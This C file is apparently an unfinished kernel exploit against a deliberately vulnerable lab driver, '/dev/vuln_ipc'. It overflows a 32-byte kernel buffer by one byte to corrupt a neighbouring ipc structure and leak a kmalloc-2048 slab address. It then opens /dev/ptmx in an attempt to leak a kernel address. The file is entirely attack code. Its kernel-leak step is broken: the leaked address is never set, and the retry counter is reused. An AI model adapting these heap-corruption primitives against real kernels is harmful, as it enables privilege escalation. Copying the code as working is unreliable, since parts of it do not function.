/*

*/

#include <stdio.h>
#include <sys/ioctl.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>
#include <string.h>
#include <sys/shm.h>
#include <sys/types.h>
#include <sys/socket.h>

#define DEV "/dev/vuln_ipc"
#define KMALLOC_TARGET_SIZE 2048

#define NEW      0xdead0001
#define DELETE   0xdead0002
#define READ     0xdead0003
#define WRITE    0xdead0004

struct ipc {
  unsigned long id;
  char *buffer;
  size_t size;
};

struct delete_ipc {
  unsigned long id;
};
 
struct read_ipc {
  unsigned long id;
  size_t size;
  char *buffer;
};
 
struct write_ipc {
  unsigned long id;
  size_t size;
  const char *buffer;
};

struct new_ipc {
  unsigned long id;
  size_t size;
};

int ipc_new(int fd, unsigned long id, size_t size)
{
  struct new_ipc* i = (struct new_ipc*) malloc(sizeof(struct new_ipc));
  if (i == NULL) {
    perror("[!] Failed to allocate new struct");
    return -1;
  }
  i->id = id;
  i->size = size;

  int w = ioctl(fd, NEW, i);
  if (w < 0) {
    perror("[!] Failed to create new ipc");
    free(i);
    return -1;
  }

  free(i);

  return 0;
}

int ipc_delete(int fd, unsigned long id)
{
  struct delete_ipc* d = (struct delete_ipc*) malloc(sizeof(struct delete_ipc));
  if (d == NULL){
    perror("[!] Failed to allocate delete_ipc");
    return -1;
  }
  
  d->id = id;
  
  int i = ioctl(fd, DELETE, d);
  if (i < 0) {
    perror("[!] Failed to delete ipc");
    free(d);
    return -1;
  }

  free(d);

  return 0;
}

char *ipc_read(int fd, unsigned long id, size_t size)
{
  int i;
  struct read_ipc* r = (struct read_ipc*) malloc(sizeof(struct read_ipc));
  char *copy;
  
  if (r == NULL) {
    perror("[!] Failed to allocate read_ipc");
    return NULL;
  }

  r->id = id;
  r->size = size;
  r->buffer = (char*) malloc(r->size);
  
  i = ioctl(fd, READ, r);
  if (i < 0) {
    perror("[!] Failed to read ipc");
    free(r->buffer);
    free(r);
    return NULL;
  }

  copy = (char*) malloc(r->size); 
  memcpy(copy, r->buffer, r->size);

  printf("buffer for channel: %ld\n", id);
  for (unsigned int i = 0; i < size; i++) {
    printf("%x", copy[i] & 0xff);
  }
  printf("\n");

  free(r->buffer);
  free(r);

  return copy;
}

int ipc_write(int fd, unsigned long id, size_t size, const char *buffer)
{
  struct write_ipc* w = (struct write_ipc*) malloc(sizeof(struct write_ipc));
  if (w == NULL) {
    perror("[!] Failed to allocate write_ipc");
    return -1;
  }
  
  w->id = id;
  w->size = size;
  w->buffer = buffer;

  int i = ioctl(fd, WRITE, w);
  if (i < 0) {
    perror("[!] Failed to write ipc");
    return -1;
  }

  free(w);

  return 0;
}

void heap_leak (int fd, unsigned long *kmalloc_leak, int *fake_ipc_index, int *last_index)
{
  char b[33];
  unsigned int i = 0;

  while (i <= 0x10) {
    i++;
    ipc_new(fd, i, 32);
  }

  memset(b, 0x41, 32);
  memset(b+32, 0x08, 1);

  *fake_ipc_index = i-2;
  ipc_write(fd, i, 33, b);
  
  i++;
  ipc_new(fd, i, 128);
  
  i++;
  *last_index = i;
  ipc_new(fd, i, KMALLOC_TARGET_SIZE); // leaking kmalloc-2048

  char *r = ipc_read(fd, *fake_ipc_index, 32);

  for (unsigned int j = 23; j > 15; j--) {
    *kmalloc_leak = (*kmalloc_leak << 8) + (r[j] & 0xff); 
  }

  free(r);

  while (i > 0) {
    ipc_delete(fd, i);
    i--;
  }
}

void kernel_leak(int fd, unsigned long *kernel_address, unsigned long *kmalloc_leak, int *fake_ipc_index, int *last_index)
{ 
  char b[33];
  char fake_ipc_struct[32];
  char *r;
  int pwn;
  unsigned int i = 0;

  pwn = open("/dev/ptmx", 'r');

  while (i < 0xa) {
    i++;
    ipc_new(fd, i, 32);
  }

  memset(b, 0x41, 32);
  memset(b+32, 0x08, 1);

  *fake_ipc_index = i-2;
  ipc_write(fd, i, 33, b);
  
  i++;
  ipc_new(fd, i, 128);
  
  i++;
  *last_index = i;
  ipc_new(fd, i, KMALLOC_TARGET_SIZE); // leaking kmalloc-2048

  memset(fake_ipc_struct, 0x41, 32);

  ipc_write(fd, *fake_ipc_index, 32, fake_ipc_struct);

  //ipc_write(fd, *last_index, 32, b);

  r = ipc_read(fd, *last_index, 4096);
  
  free(r);
  close(pwn);

  while (i > 0) {
    ipc_delete(fd, i);
    i--;
  }
}

int main(void)
{
  int fd;
  unsigned long kmalloc_leak = 0, kmalloc_base = 0;
  unsigned long kernel_address = 0, kernel_base = 0;
  int fake_ipc_index = 0, last_index = 0;
  unsigned int try = 0;
  
  fd = open(DEV, O_RDWR);
  if (fd < 0) {
    perror("[!] Failed to opend device");
    return -1;
  }
  
  printf("[+] Need a heap and kernel leak...\n");
  
  while (kmalloc_leak == 0 && try < 5) {
    fake_ipc_index = 0;
    last_index = 0;
    kmalloc_leak = 0;
    heap_leak(fd, &kmalloc_leak, &fake_ipc_index, &last_index);
    try++;
    if (try == 5) {
      printf("[!] failed to get heap leak\n");
      return -1;
    }
  }

  kmalloc_base = kmalloc_leak - KMALLOC_TARGET_SIZE;
  printf("[+] Got leak ! kmalloc-%d slab base: 0x%lx\n", KMALLOC_TARGET_SIZE, kmalloc_base);

  while (kernel_address == 0 && try < 5) {
    fake_ipc_index = 0;
    last_index = 0;
    kernel_address = 0;
    kernel_leak(fd, &kernel_address, &kmalloc_leak, &fake_ipc_index, &last_index);
    try++;
    if (try == 5) {
      printf("[!] failed to get kernel leak\n");
      return -1;
    }
  }

  kernel_base = kernel_address - 0;
  printf("[+] Got leak ! kernel_base: 0x%lx\n", kernel_base);

  close(fd);

  return 0;
}